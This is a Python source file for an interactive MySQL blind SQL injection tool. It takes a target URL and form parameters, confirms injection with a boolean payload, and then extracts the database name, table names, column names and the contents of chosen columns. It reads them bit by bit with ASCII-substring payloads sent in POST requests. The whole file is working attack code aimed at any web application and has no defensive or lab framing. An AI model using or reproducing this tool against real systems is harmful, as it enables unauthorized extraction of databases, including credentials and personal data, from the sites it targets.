import requests
import sys


# MySQL Blind SQL Injection Tool
def blind_sql_injection_attack():
    query = "'and'1'='1'#"  # vulnerabilities detection query
    payloads = {}
    attack_parameter_name = ""
    attack_parameter_value = ""

    URL = input("Enter the target URL for the attack : ")
    query = input("Enter the vulnerabilities detection query (Ex: 'and'1'='1'#) ")
    while True:
        key = input("Enter the parameter name for the target URL : ")
        values = input(
            "Enter the required values for the parameters in the target URL : "
        )
        payloads_check = input(
            f"Do you want to add attack syntax to the {key} parameter? (Y or N) "
        )
        if payloads_check.upper() == "Y":
            payloads[key] = values + query
            attack_parameter_name = key
            attack_parameter_value = values
            print(payloads)
        else:
            payloads[key] = values
            print(payloads)

        break_check = input("Do you want to end parameter entry? (Y or N) ")
        if break_check.upper() == "Y":
            break
    control_point = input(
        "Enter a string of control points to detect if a blind sql injection attack is true or false : "
    )

    print(f"attack payloads : {payloads}")
    resp = requests.post(f"{URL}", data=payloads)
    if control_point in resp.text:
        print("Blind SQL injection vulnerability exists. Start the attack.")
        database = database_name(
            URL,
            control_point,
            payloads,
            attack_parameter_name,
            attack_parameter_value,
        )
        table_name(
            URL,
            database,
            control_point,
            payloads,
            attack_parameter_name,
            attack_parameter_value,
        )
        table = column_name(
            URL,
            control_point,
            payloads,
            attack_parameter_name,
            attack_parameter_value,
        )
        query_data(
            URL,
            table,
            control_point,
            payloads,
            attack_parameter_name,
            attack_parameter_value,
        )
    else:
        print(resp.text)
        print("No blind SQL injection vulnerabilities were found.")


def database_name(
    URL, control_point, payloads, attack_parameter_name, attack_parameter_value
):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    database = ""
    for x in range(1, 30):
        for n in binary_number:
            payloads[attack_parameter_name] = (
                attack_parameter_value
                + f"'and ascii(substring(database(),{x},1))&{n}={n}#"
            )

            resp = requests.post(URL, payloads)
            if control_point in resp.text:
                binary_result += n
            else:
                continue
        if binary_result == 0:
            break
        else:
            database += chr(binary_result)
            binary_result = 0

    print(f"database name : {database}")
    return database


def table_name(
    URL,
    database,
    control_point,
    payloads,
    attack_parameter_name,
    attack_parameter_value,
):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    table = []
    query = f"select table_name from information_schema.tables where table_schema='{database}'"

    for i in range(0, 10):
        name = ""
        for x in range(1, 10):
            for n in binary_number:
                payloads[attack_parameter_name] = (
                    attack_parameter_value
                    + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                )
                resp = requests.post(URL, payloads)
                if control_point in resp.text:
                    binary_result += n  # sum of binary numbers
                else:
                    continue
            if binary_result == 0:
                break  # When it gets the table name, it stops to get the next table name.
            else:
                name += chr(binary_result)  # Add each letter of the table name
                binary_result = 0
        if len(name) == 0:
            break  # If there are no tables to add to the list, stop the for statement.
        else:
            table.append(name)  # Saving to a list of table names.
    print(f"The list of tables in the {database} database.")
    print(f"{table}")


def column_name(
    URL,
    control_point,
    payloads,
    attack_parameter_name,
    attack_parameter_value,
):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    columns = []
    table_name = input("Enter a table name to output a list of columns in that table. ")
    query = f"select column_name from information_schema.columns where table_name='{table_name}'"

    for i in range(0, 10):
        name = ""
        for x in range(1, 10):
            for n in binary_number:
                payloads[attack_parameter_name] = (
                    attack_parameter_value
                    + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                )

                resp = requests.post(URL, payloads)
                if control_point in resp.text:
                    binary_result += n  # sum of binary numbers
                else:
                    continue
            if binary_result == 0:
                break  # When it gets the table name, it stops to get the next table name.
            else:
                name += chr(binary_result)  # Add each letter of the table name
                binary_result = 0
        if len(name) == 0:
            break  #  If there are no tables to add to the list, stop the for statement.
        else:
            columns.append(name)  # Saving to a list of table names.
    print(f"The list of columns in the {table_name} table.")
    print(f"{columns}")
    return table_name


def query_data(
    URL,
    table_name,
    control_point,
    payloads,
    attack_parameter_name,
    attack_parameter_value,
):
    column_name = input("Enter a column name to output a list of data in that column. ")
    query = f"select {column_name} from {table_name}"
    query_data_start(
        URL,
        query,
        control_point,
        column_name,
        payloads,
        attack_parameter_name,
        attack_parameter_value,
    )
    quit_button = input("Do you want to end the SQLi attack? (Y or N) ")
    if quit_button.upper() == "Y":
        sys.exit(0)
    else:
        query_data(
            URL,
            table_name,
            control_point,
            payloads,
            attack_parameter_name,
            attack_parameter_value,
        )


def query_data_start(
    URL,
    query,
    control_point,
    column_name,
    payloads,
    attack_parameter_name,
    attack_parameter_value,
):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    binary_length = 0
    data = []
    for i in range(0, 30):
        name = ""
        for x in range(1, 30):
            for n in binary_number:
                payloads[attack_parameter_name] = (
                    attack_parameter_value
                    + f"'and ascii(substring(({query} limit {i},1),{x},1))&{n}={n}#"
                )

                resp = requests.post(URL, payloads)
                if control_point in resp.text:
                    binary_result += n  # sum of binary numbers
                    binary_length += n
                else:
                    continue
            if binary_result == 0:
                break  # When it gets the table name, it stops to get the next table name.
            else:
                name += chr(binary_result)  # Add each letter of the table name
                binary_result = 0
                binary_length = 0
        if len(name) == 0:
            break  #  If there are no tables to add to the list, stop the for statement.
        else:
            data.append(name)  # Saving to a list of table names.
    print(f"The result of looking up the data in the {column_name} column.")
    print(f"{data}")
